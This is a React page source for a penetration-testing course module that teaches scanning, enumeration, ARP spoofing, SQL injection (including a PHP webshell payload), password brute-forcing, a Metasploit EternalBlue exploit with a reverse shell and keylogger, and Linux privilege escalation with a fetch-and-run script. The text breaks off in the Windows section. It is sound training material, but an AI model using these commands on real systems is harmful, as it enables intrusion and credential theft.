'use client'
import React from 'react'
import Link from 'next/link'

const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: '#bf5fff', marginTop: '3rem', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '10px' }}>
    <span style={{ color: '#2a0050', fontSize: '0.8rem' }}>//</span> {children}
  </h2>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', fontWeight: 600, color: '#9933cc', marginTop: '2rem', marginBottom: '0.75rem' }}>▸ {children}</h3>
)
const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
)
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#050805', border: '1px solid #1a002e', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: '#bf5fff', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const Alert = ({ type, children }: { type: 'info' | 'warn' | 'danger' | 'tip' | 'beginner'; children: React.ReactNode }) => {
  const c: Record<string, [string, string, string]> = {
    info:     ['#bf5fff', 'rgba(191,95,255,0.05)', 'NOTE'],
    warn:     ['#ffb347', 'rgba(255,179,71,0.05)', 'WARNING'],
    danger:   ['#ff4136', 'rgba(255,65,54,0.06)',  'CRITICAL'],
    tip:      ['#00ff41', 'rgba(0,255,65,0.04)',   'PRO TIP'],
    beginner: ['#00d4ff', 'rgba(0,212,255,0.05)',  'BEGINNER NOTE'],
  }
  const [color, bg, label] = c[type]
  return (
    <div style={{ background: bg, borderLeft: '3px solid ' + color, padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.5rem 0', border: '1px solid ' + color + '33', borderLeftColor: color }}>
      <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color, letterSpacing: '0.2em', marginBottom: '6px' }}>{label}</div>
      <div style={{ color: '#8a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}
const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
      <thead>
        <tr style={{ borderBottom: '1px solid #1a002e' }}>
          {headers.map((h, i) => <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: '#9933cc', fontWeight: 600, letterSpacing: '0.1em', fontSize: '0.7rem' }}>{h}</th>)}
        </tr>
      </thead>
      <tbody>
        {rows.map((row, i) => (
          <tr key={i} style={{ borderBottom: '1px solid #0e001a', background: i % 2 === 0 ? 'transparent' : 'rgba(191,95,255,0.02)' }}>
            {row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#8a9a8a', verticalAlign: 'top' }}>{cell}</td>)}
          </tr>
        ))}
      </tbody>
    </table>
  </div>
)

export default function OffensiveModule() {
  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a' }}>
        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <span style={{ color: '#bf5fff' }}>MOD-04 // OFFENSIVE SECURITY</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: 'rgba(191,95,255,0.08)', border: '1px solid rgba(191,95,255,0.3)', borderRadius: '3px', color: '#bf5fff', fontSize: '8px', letterSpacing: '0.15em' }}>CONCEPT</span>
          <Link href="/modules/offensive/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(191,95,255,0.1)', border: '1px solid rgba(191,95,255,0.5)', borderRadius: '3px', color: '#bf5fff', fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB →</Link>
        </div>
      </div>

      {/* Header */}
      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MODULE 04 · CONCEPT PAGE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: '#bf5fff', margin: '0.5rem 0', lineHeight: 1.1, textShadow: '0 0 20px rgba(191,95,255,0.35)' }}>OFFENSIVE SECURITY</h1>
        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', lineHeight: 1.6 }}>
          Penetration testing methodology · Network attacks · Web app exploitation · Privilege escalation · Post-exploitation · Reporting
        </p>
      </div>

      {/* TOC */}
      <div style={{ background: '#0a0010', border: '1px solid #1a002e', borderRadius: '6px', padding: '1.25rem', marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.2em', marginBottom: '0.75rem' }}>TABLE OF CONTENTS</div>
        {[
          '01 — Penetration Testing Methodology & Phases',
          '02 — Reconnaissance: Active Scanning with Nmap',
          '03 — Enumeration: Services, Users & Shares',
          '04 — Vulnerability Scanning with Nessus & OpenVAS',
          '05 — Network Attacks: MITM, ARP Poisoning & Sniffing',
          '06 — Web Application Attacks: OWASP Top 10',
          '07 — SQL Injection: Manual & Automated',
          '08 — Authentication Attacks: Brute Force, Credential Stuffing',
          '09 — Exploitation with Metasploit Framework',
          '10 — Privilege Escalation: Linux & Windows',
          '11 — Post-Exploitation & Persistence',
          '12 — Reporting: Writing Professional Pentest Reports',
        ].map((item, i) => (
          <div key={i} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a7a5a', padding: '3px 0', display: 'flex', gap: '8px' }}>
            <span style={{ color: '#2a0050' }}>›</span><span>{item}</span>
          </div>
        ))}
      </div>

      {/* 01 */}
      <H2>01 — Penetration Testing Methodology & Phases</H2>
      <Alert type="beginner">
        In plain English: a penetration test (&quot;pentest&quot;) is when a company hires you to try to hack them — legally. The goal is to find the weaknesses before real attackers do. The only thing that makes it legal is written permission. Everything a pentester does looks identical to what a criminal hacker does from a technical standpoint — the difference is entirely in the authorisation. Never probe a system without explicit written permission from its owner.
      </Alert>
      <P>Penetration testing is a structured, authorised attempt to compromise a system to identify security weaknesses before malicious actors do. The key word is authorised — a signed scope-of-work document is what separates a penetration tester from a criminal.</P>

      <H3>The Five Phases</H3>
      <Pre label="// PENTEST LIFECYCLE">{`PHASE 1: PLANNING & SCOPING
  ├── Rules of Engagement (RoE) signed
  ├── Define: IP ranges, domains, applications in scope
  ├── Define: What is OUT of scope (production DBs, specific servers)
  ├── Timeline: start date, end date, reporting deadline
  ├── Emergency contacts: if you break something, who do you call?
  └── Legal: written authorisation letter — carry it always

PHASE 2: RECONNAISSANCE
  ├── Passive: OSINT, WHOIS, DNS, Shodan, LinkedIn (no target contact)
  └── Active: Nmap scanning, service fingerprinting, banner grabbing

PHASE 3: ENUMERATION & VULNERABILITY ANALYSIS
  ├── Enumerate: users, shares, services, versions, configs
  ├── Scan: Nessus / OpenVAS automated vulnerability scan
  └── Research: CVEs for identified software versions

PHASE 4: EXPLOITATION
  ├── Attempt to exploit identified vulnerabilities
  ├── Document: every action with timestamp and screenshot
  ├── Pivot: use compromised system to reach deeper targets
  └── Goal: demonstrate real-world impact, not just run a scanner

PHASE 5: POST-EXPLOITATION & REPORTING
  ├── Privilege escalation to highest available level
  ├── Data exfiltration simulation (proof of access)
  ├── Persistence demonstration (optional, per scope)
  ├── Clean up: remove all tools, shells, created accounts
  └── Report: executive summary + technical findings + remediation`}</Pre>

      <H3>Pentest Types</H3>
      <Table headers={['TYPE', 'KNOWLEDGE GIVEN', 'SIMULATES', 'BEST FOR']} rows={[
        ['Black Box', 'No information — just a target company name', 'External attacker with no insider knowledge', 'Real-world external attack simulation'],
        ['Grey Box', 'Limited info — credentials, network diagram', 'Attacker with some legitimate access', 'Internal threat, insider, compromised account'],
        ['White Box', 'Full access — source code, architecture, credentials', 'Thorough security review', 'Deep code-level audit, maximum coverage'],
        ['Red Team', 'Black box + physical + social engineering', 'Advanced persistent threat (APT)', 'Mature security programs, testing detection'],
      ]} />

      <Alert type="warn">Always carry your written authorisation. If police or security arrive mid-engagement, stop immediately, present your authorisation letter, and contact your client. Never argue — let the paperwork speak. Verbal permission means nothing legally.</Alert>

      {/* 02 */}
      <H2>02 — Reconnaissance: Active Scanning with Nmap</H2>
      <Alert type="beginner">
        A &quot;port&quot; is a numbered channel that a service listens on. Port 80 = HTTP (websites). Port 22 = SSH (remote terminal). Port 443 = HTTPS. Every server typically has thousands of ports — most closed, some open. Nmap knocks on each port and records which ones respond, and what software answered. This tells an attacker (or defender) the entire attack surface of a machine. Think of it like walking around a building checking every door and window, noting which are unlocked and what lock brand they use.
      </Alert>
      <P>Nmap (Network Mapper) is the industry-standard tool for network discovery and security auditing. It identifies live hosts, open ports, running services, software versions, and operating systems. Mastering Nmap is non-negotiable for any security professional.</P>

      <Pre label="// NMAP — COMPLETE REFERENCE">{`# Install
sudo apt install nmap

# BASIC SCANS
nmap 192.168.1.1                    # single host
nmap 192.168.1.1-254                # range
nmap 192.168.1.0/24                 # subnet
nmap -iL targets.txt                # from file

# HOST DISCOVERY (before port scanning)
nmap -sn 192.168.1.0/24            # ping sweep — find live hosts
nmap -sn -PS 192.168.1.0/24       # TCP SYN ping (bypasses ICMP blocks)
nmap -sn -PA 192.168.1.0/24       # TCP ACK ping

# PORT SCAN TYPES
nmap -sS 192.168.1.1               # SYN scan (stealth) — DEFAULT, requires root
nmap -sT 192.168.1.1               # TCP connect (no root needed, louder)
nmap -sU 192.168.1.1               # UDP scan (slow but important)
nmap -sA 192.168.1.1               # ACK scan — maps firewall rules

# PORT SELECTION
nmap -p 80,443,8080 192.168.1.1   # specific ports
nmap -p 1-65535 192.168.1.1       # all ports
nmap -p- 192.168.1.1               # same as above (shorthand)
nmap --top-ports 1000 192.168.1.1  # top 1000 most common (default)
nmap -F 192.168.1.1                # fast — top 100 ports

# SERVICE & VERSION DETECTION
nmap -sV 192.168.1.1               # service version detection
nmap -sV --version-intensity 9     # max intensity (slower, more accurate)

# OS DETECTION
nmap -O 192.168.1.1                # OS fingerprinting
nmap -O --osscan-guess             # aggressive guess if no exact match

# SCRIPT ENGINE (NSE)
nmap -sC 192.168.1.1               # default scripts
nmap --script vuln 192.168.1.1     # run vulnerability scripts
nmap --script http-enum 192.168.1.1 # enumerate web directories
nmap --script smb-vuln-* 192.168.1.1 # SMB vulnerabilities
nmap --script ssh-brute 192.168.1.1  # SSH brute force

# EVASION TECHNIQUES
nmap -D RND:10 192.168.1.1         # decoy scan — hide among fake IPs
nmap -S 192.168.2.100 192.168.1.1  # spoof source IP
nmap --data-length 25 192.168.1.1  # add random data to packets
nmap -f 192.168.1.1                # fragment packets
nmap --mtu 24 192.168.1.1          # custom MTU
nmap -T0 192.168.1.1               # paranoid timing (slowest, stealthiest)
nmap --scan-delay 5s               # delay between probes

# TIMING TEMPLATES (T0=paranoid to T5=insane)
nmap -T1 target   # sneaky
nmap -T3 target   # normal (default)
nmap -T4 target   # aggressive (faster, noisier)
nmap -T5 target   # insane (very fast, unreliable)

# OUTPUT
nmap -oN output.txt target         # normal text
nmap -oX output.xml target         # XML (for tools like Metasploit)
nmap -oG output.gnmap target       # grepable
nmap -oA output target             # all three formats

# THE FULL RECON SCAN (comprehensive but noisy)
nmap -sV -sC -O -p- -T4 -oA full_scan 192.168.1.1`}</Pre>

      {/* 03 */}
      <H2>03 — Enumeration: Services, Users & Shares</H2>
      <P>After discovering open ports, enumeration extracts detailed information from each service — usernames, file shares, email addresses, database schemas, application endpoints. This is where you build the map that guides exploitation.</P>

      <H3>SMB Enumeration (Windows Networks)</H3>
      <Pre label="// SMB — WINDOWS FILE SHARING PROTOCOL">{`# SMB runs on port 445 — one of the richest information sources

# Nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users -p445 192.168.1.1
nmap --script smb-vuln-ms17-010 -p445 192.168.1.1  # EternalBlue check

# enum4linux — Linux tool for SMB/SAMBA enumeration
sudo apt install enum4linux
enum4linux -a 192.168.1.1     # all checks
enum4linux -U 192.168.1.1     # users only
enum4linux -S 192.168.1.1     # shares only
enum4linux -P 192.168.1.1     # password policy

# smbclient — browse shares manually
smbclient -L //192.168.1.1 -N          # list shares (null session)
smbclient //192.168.1.1/share -N       # connect to share
smbclient //192.168.1.1/share -U user  # with credentials

# CrackMapExec — Swiss army knife for Windows networks
pip install crackmapexec
cme smb 192.168.1.0/24                 # discover Windows hosts
cme smb 192.168.1.1 -u user -p pass    # test credentials
cme smb 192.168.1.1 --shares           # enumerate shares
cme smb 192.168.1.1 --users            # enumerate users
cme smb 192.168.1.1 --pass-pol         # password policy`}</Pre>

      <H3>Web Enumeration</H3>
      <Pre label="// WEB DIRECTORY & FILE ENUMERATION">{`# Gobuster — directory brute forcing
sudo apt install gobuster

# Directory scan
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js

# DNS subdomain enumeration
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Feroxbuster — recursive, faster than gobuster
cargo install feroxbuster
feroxbuster -u http://192.168.1.1 -w wordlist.txt --depth 3

# ffuf — flexible fuzzer
sudo apt install ffuf
ffuf -w wordlist.txt -u http://target/FUZZ              # directory
ffuf -w wordlist.txt -u http://target/FUZZ.php          # with extension
ffuf -w users.txt:USER -w passes.txt:PASS \
     -u http://target/login -d "user=USER&pass=PASS"    # POST form fuzz

# Nikto — web server scanner
sudo apt install nikto
nikto -h http://192.168.1.1
nikto -h http://192.168.1.1 -Tuning 1,2,3,4   # specific checks`}</Pre>

      <H3>SNMP Enumeration</H3>
      <Pre label="// SNMP — NETWORK DEVICE INTEL">{`# SNMP port 161 UDP — reveals router configs, OS info, running processes

sudo apt install snmp snmp-mibs-downloader onesixtyone

# Check if SNMP is open
nmap -sU -p 161 192.168.1.1

# onesixtyone — brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.1

# snmpwalk — dump everything with known community string
snmpwalk -v2c -c public 192.168.1.1                # v2c with 'public'
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1 # system info OID
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.4.1   # enterprise OIDs

# Key OIDs to pull:
# System info:     1.3.6.1.2.1.1.1.0
# Hostname:        1.3.6.1.2.1.1.5.0
# Running procs:   1.3.6.1.2.1.25.4.2.1.2
# Installed sw:    1.3.6.1.2.1.25.6.3.1.2
# Network ifaces:  1.3.6.1.2.1.2.2.1.2
# Routing table:   1.3.6.1.2.1.4.21.1.1`}</Pre>

      {/* 04 */}
      <H2>04 — Vulnerability Scanning</H2>
      <Pre label="// OPENVAS / GREENBONE — FREE VULNERABILITY SCANNER">{`# Install Greenbone (OpenVAS) on Kali/Debian
sudo apt install openvas
sudo gvm-setup      # takes 10-20 min — downloads vuln DB
sudo gvm-start

# Access web UI: https://127.0.0.1:9392
# Default creds: admin / (shown during setup)

# CLI scanning:
gvm-cli socket --gmp-username admin --gmp-password PASS \
  --xml "<get_tasks/>"

# Nessus (industry standard — free for home use)
# Download: https://www.tenable.com/products/nessus
# Nessus Essentials = free, up to 16 IPs

# What vulnerability scanners find:
# - Missing patches (CVEs by version number)
# - Misconfigurations (default credentials, weak TLS)
# - Open dangerous services (Telnet, FTP, old SMB)
# - SSL/TLS weaknesses (BEAST, POODLE, heartbleed)
# - Web application issues (SQLi, XSS, directory traversal)`}</Pre>

      {/* 05 */}
      <H2>05 — Network Attacks: MITM, ARP Poisoning & Sniffing</H2>

      <H3>ARP Poisoning</H3>
      <Pre label="// ARP SPOOFING — BECOME THE MAN IN THE MIDDLE">{`# ARP has no authentication — anyone can claim any IP
# ARP poison = tell victim our MAC = gateway IP
#            = tell gateway our MAC = victim IP
# Result: all traffic flows through us

sudo apt install arpspoof dsniff

# Enable IP forwarding (so traffic still reaches destination)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Poison victim → tell victim we are the gateway
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Poison gateway → tell gateway we are the victim
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Run both in parallel (separate terminals)
# Now all traffic between victim and gateway passes through us

# Capture with Wireshark or tcpdump:
sudo tcpdump -i eth0 -w capture.pcap host 192.168.1.100

# Better: use Ettercap for all-in-one MITM
sudo apt install ettercap-graphical
sudo ettercap -G   # graphical UI`}</Pre>

      <H3>Responder — Windows Credential Capture</H3>
      <Pre label="// RESPONDER — CAPTURE NTLM HASHES ON LOCAL NETWORK">{`# Responder listens for LLMNR/NBT-NS/MDNS broadcast queries
# When a Windows host tries to resolve a name that fails DNS,
# it falls back to broadcast — Responder answers claiming to be the target
# Windows then sends NTLM authentication → we capture the hash

git clone https://github.com/lgandx/Responder
cd Responder
sudo python3 Responder.py -I eth0 -rdwv

# What you get:
# [SMB] NTLMv2 Hash : user::DOMAIN:challenge:response
# [HTTP] NTLMv2 Hash: ...

# Crack the hash with hashcat:
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
# -m 5600 = NTLMv2 mode`}</Pre>

      {/* 06 */}
      <H2>06 — Web Application Attacks: OWASP Top 10</H2>
      <Alert type="beginner">
        OWASP (Open Web Application Security Project) publishes a list of the 10 most common and critical web vulnerabilities, updated every few years based on real-world breach data. These are not theoretical — every item on the list has caused major breaches. If you understand and can identify all 10, you can assess the security posture of almost any web application. The free PortSwigger Web Security Academy (portswigger.net/web-security) has a full lab for every single one — it is the best free resource in web security.
      </Alert>
      <Table headers={['RANK', 'VULNERABILITY', 'WHAT IT ENABLES', 'EXAMPLE']} rows={[
        ['A01', 'Broken Access Control', 'Access other users\' data, admin functions', 'Change ?user_id=123 to ?user_id=124 in URL'],
        ['A02', 'Cryptographic Failures', 'Steal passwords, PII, financial data', 'Passwords stored in MD5, HTTP instead of HTTPS'],
        ['A03', 'Injection (SQLi, XSS, LDAP)', 'Database dump, session hijack, code execution', 'Login: \' OR 1=1--'],
        ['A04', 'Insecure Design', 'Bypass business logic', 'Can apply unlimited discount coupons'],
        ['A05', 'Security Misconfiguration', 'Default creds, exposed admin panels, debug mode', 'admin:admin on /admin, debug=True in Django'],
        ['A06', 'Vulnerable Components', 'Known CVE exploitation', 'Old Log4j version → Log4Shell RCE'],
        ['A07', 'Auth & Session Failures', 'Account takeover, session fixation', 'Predictable session tokens, no rate limiting'],
        ['A08', 'Software & Data Integrity', 'Malicious updates, CI/CD compromise', 'SolarWinds-style supply chain attack'],
        ['A09', 'Logging & Monitoring Failures', 'Attacks go undetected', 'No alerts on 1000 failed logins'],
        ['A10', 'SSRF', 'Reach internal services via server', 'url=http://169.254.169.254/latest/meta-data/'],
      ]} />

      <H3>Burp Suite — The Essential Web Proxy</H3>
      <Pre label="// BURP SUITE SETUP & CORE FEATURES">{`# Download: https://portswigger.net/burp/communitydownload
# Community edition = free, sufficient for most work

# Setup:
# 1. Configure browser proxy: 127.0.0.1:8080
# 2. Visit http://burpsuite (in browser) → install CA cert → trust it
# 3. All HTTPS traffic now visible and interceptable

# CORE FEATURES:

# PROXY → Intercept
# Catch every request, modify before it's sent
# Change parameters, headers, cookies, request body

# REPEATER
# Resend a request with modifications, see response
# Perfect for: manual SQLi testing, parameter tampering

# INTRUDER
# Automated request fuzzing with payload lists
# Attack types: Sniper, Battering Ram, Pitchfork, Cluster Bomb
# Use for: brute force login, parameter fuzzing

# SCANNER (Pro only — Community has passive only)
# Automated vulnerability detection

# KEY WORKFLOW:
# 1. Browse target → build sitemap in Target tab
# 2. Identify interesting endpoints in HTTP History
# 3. Send to Repeater → manually test for vulns
# 4. Send to Intruder → automate with wordlists
# 5. Use Decoder for base64/URL/hex encoding`}</Pre>

      {/* 07 */}
      <H2>07 — SQL Injection: Manual & Automated</H2>
      <P>SQL injection remains one of the most critical and common web vulnerabilities. It occurs when user input is incorporated into SQL queries without proper sanitisation, allowing attackers to manipulate the database query itself.</P>

      <H3>Manual SQLi Testing</H3>
      <Pre label="// SQL INJECTION — FROM DETECTION TO EXPLOITATION">{`# STEP 1: DETECTION — test for error-based SQLi
# Try these in any input field, URL parameter, or cookie:
'                          # single quote — breaks SQL string
''                         # two quotes — fixes broken string
' OR '1'='1               # always-true condition
' OR '1'='2               # always-false condition
1; DROP TABLE users--     # statement termination (mostly blocked)
' OR SLEEP(5)--           # time-based blind (MySQL)
'; WAITFOR DELAY '0:0:5'-- # time-based (MSSQL)

# STEP 2: DETERMINE DATABASE TYPE
# MySQL:     ' OR 1=1-- -    (note double dash + space)
# PostgreSQL: ' OR 1=1--
# MSSQL:     ' OR 1=1--
# Oracle:    ' OR 1=1--

# STEP 3: UNION-BASED EXTRACTION
# First: find number of columns in original query
' ORDER BY 1--             # no error? at least 1 column
' ORDER BY 2--             # no error? at least 2 columns
' ORDER BY 5--             # error? query has 4 columns

# Then: extract data via UNION
' UNION SELECT 1,2,3,4--                        # find which columns display
' UNION SELECT 1,database(),3,4--               # get DB name
' UNION SELECT 1,group_concat(table_name),3,4
  FROM information_schema.tables
  WHERE table_schema=database()--               # get table names
' UNION SELECT 1,group_concat(column_name),3,4
  FROM information_schema.columns
  WHERE table_name='users'--                    # get column names
' UNION SELECT 1,group_concat(username,':',password),3,4
  FROM users--                                  # dump credentials

# STEP 4: READ/WRITE FILES (if permissions allow)
' UNION SELECT 1,load_file('/etc/passwd'),3,4-- # read system file
' UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3,4
  INTO OUTFILE '/var/www/html/shell.php'--      # write webshell`}</Pre>

      <H3>SQLMap — Automated SQLi</H3>
      <Pre label="// SQLMAP — AUTOMATE THE ENTIRE PROCESS">{`sudo apt install sqlmap

# Basic scan:
sqlmap -u "http://target.com/page?id=1"

# POST request:
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# With session cookie:
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Specific database:
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# Extract everything:
sqlmap -u "http://target.com/page?id=1" --dbs          # list databases
sqlmap -u "http://target.com/page?id=1" -D dbname --tables  # list tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump  # dump table

# Bypass WAF:
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase
sqlmap -u "http://target.com/page?id=1" --random-agent  # random user agent
sqlmap -u "http://target.com/page?id=1" --tor            # route through Tor

# OS shell (if writable web root):
sqlmap -u "http://target.com/page?id=1" --os-shell

# Import from Burp Suite:
# Save request in Burp → right click → Save item
sqlmap -r burp_request.txt`}</Pre>

      {/* 08 */}
      <H2>08 — Authentication Attacks</H2>
      <Pre label="// HYDRA — ONLINE BRUTE FORCE">{`sudo apt install hydra

# SSH brute force:
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
hydra -L users.txt -P passes.txt ssh://192.168.1.1 -t 4  # 4 threads

# FTP:
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.1

# HTTP POST form:
hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth:
hydra -l admin -P rockyou.txt http-get://192.168.1.1/admin

# RDP:
hydra -l administrator -P rockyou.txt rdp://192.168.1.1`}</Pre>

      <Pre label="// HASHCAT — OFFLINE PASSWORD CRACKING">{`# Install: https://hashcat.net/hashcat/
sudo apt install hashcat

# Identify hash type first:
hashid hash.txt
# Or use: https://hashes.com/en/tools/hash_identifier

# Common hash modes:
# 0    = MD5
# 100  = SHA1
# 1000 = NTLM (Windows)
# 1800 = sha512crypt (Linux /etc/shadow)
# 3200 = bcrypt
# 5500 = NTLMv1
# 5600 = NTLMv2 (Responder captures)
# 13100 = Kerberos 5 TGS (Kerberoasting)

# Dictionary attack:
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Rules (mangling — adds numbers, caps, special chars):
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force (mask attack):
hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?d?d?d?d
# ?u=uppercase, ?l=lowercase, ?d=digit, ?s=special

# Combination attack:
hashcat -m 1000 hash.txt -a 1 wordlist1.txt wordlist2.txt`}</Pre>

      {/* 09 */}
      <H2>09 — Exploitation with Metasploit Framework</H2>
      <Alert type="beginner">
        Metasploit is a framework that organises hundreds of exploit modules, payloads, and post-exploitation tools into a single interface. Think of it as a library: you search for an exploit by name or CVE, load it, set the target IP, choose a payload (what runs on the target after exploitation), and fire. A &quot;payload&quot; is what you want to happen after a successful exploit — usually a reverse shell (the target connects back to you and gives you a command prompt). Meterpreter is an advanced payload that runs entirely in memory and gives you powerful built-in tools.
      </Alert>
      <Pre label="// METASPLOIT — COMPLETE WORKFLOW">{`sudo apt install metasploit-framework
sudo msfdb init   # initialise database
msfconsole        # launch

# BASIC COMMANDS:
msf6> search eternalblue              # search for exploits
msf6> search type:exploit platform:windows smb
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> info                            # module details
msf6> show options                    # required settings
msf6> set RHOSTS 192.168.1.100       # target
msf6> set LHOST 192.168.1.50         # your IP
msf6> set LPORT 4444                  # listener port
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> check                           # verify target is vulnerable
msf6> run                             # execute

# METERPRETER COMMANDS (post-exploitation shell):
meterpreter> sysinfo                  # system info
meterpreter> getuid                   # current user
meterpreter> getpid                   # current process ID
meterpreter> ps                       # running processes
meterpreter> hashdump                 # dump password hashes
meterpreter> upload /path/to/file     # upload file
meterpreter> download C:/file.txt     # download file
meterpreter> shell                    # drop to system shell
meterpreter> getsystem                # attempt privilege escalation
meterpreter> run post/multi/recon/local_exploit_suggester  # find local privesc
meterpreter> run post/windows/gather/credentials/credential_collector
meterpreter> screenshot               # take screenshot
meterpreter> keyscan_start            # start keylogger
meterpreter> keyscan_dump            # dump captured keys
meterpreter> migrate 1234            # migrate to another process

# PIVOTING — use compromised host to reach internal network:
meterpreter> run post/multi/manage/shell_to_meterpreter
meterpreter> route add 10.0.0.0/24 [session_id]
msf6> use auxiliary/server/socks_proxy
msf6> run   # SOCKS proxy on port 1080 → pivot through target`}</Pre>

      {/* 10 */}
      <H2>10 — Privilege Escalation: Linux & Windows</H2>
      <Alert type="beginner">
        When you first gain access to a system through an exploit, you usually land as a low-privilege user — like a regular employee account with limited access. Privilege escalation means finding a way to become the most powerful user: root on Linux (can do anything) or SYSTEM/Administrator on Windows. The techniques involve finding misconfigurations: software running as root that you can manipulate, files writable by everyone, scheduled tasks running as admin, or unpatched local kernel vulnerabilities. GTFOBins (gtfobins.github.io) is the essential reference for Linux privesc one-liners.
      </Alert>
      <P>After initial access, you typically have low-privilege shell access. Privilege escalation is the process of gaining higher permissions — root on Linux, SYSTEM on Windows. This is often where the real skill shows.</P>

      <H3>Linux Privilege Escalation</H3>
      <Pre label="// LINUX PRIVESC — SYSTEMATIC APPROACH">{`# STEP 1: SITUATIONAL AWARENESS
whoami && id                     # current user + groups
hostname && uname -a             # OS + kernel version
cat /etc/passwd                  # all users
cat /etc/cron* /var/spool/cron/* # cron jobs (look for writable scripts)
ps aux                           # running processes
netstat -tulpn                   # listening ports (internal services)
env                              # environment variables (may contain secrets)
cat ~/.bash_history              # command history

# STEP 2: SUID BINARIES (runs as root regardless of who executes)
find / -perm -u=s -type f 2>/dev/null
# For each result, check GTFOBins: https://gtfobins.github.io
# Example: if 'vim' is SUID:
vim -c ':!/bin/sh'   # drops to root shell

# STEP 3: SUDO PERMISSIONS
sudo -l   # what can current user run as root?
# If output shows: (ALL) NOPASSWD: /usr/bin/python3
python3 -c "import os; os.system('/bin/bash')"  # instant root

# STEP 4: WRITABLE CRON SCRIPTS
# If a root cron job runs a script you can write:
echo "chmod +s /bin/bash" >> /path/to/writable_script.sh
# Wait for cron to run → bash -p → root shell

# STEP 5: KERNEL EXPLOITS (last resort — risky)
uname -r   # get kernel version
searchsploit linux kernel 5.4   # find exploits
# Or: https://github.com/The-Z-Labs/linux-exploit-suggester

# AUTOMATION TOOLS:
# LinPEAS — comprehensive Linux privesc checker
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh`}</Pre>

      <H3>Windows Privilege Escalation</H3>
      <Pre label="// WINDOWS PRIVESC — SYSTEMATIC APPROACH">{`# STEP 1: SITUATIONAL AWARENESS
whoami /all                           # user + privileges + groups
systeminfo                            # OS, patches, hotfixes
net users                             # all local users
net localgroup administrators         # members of Admins group
tasklist /svc                         # running processes + services
netstat -ano                          # open connections + PIDs
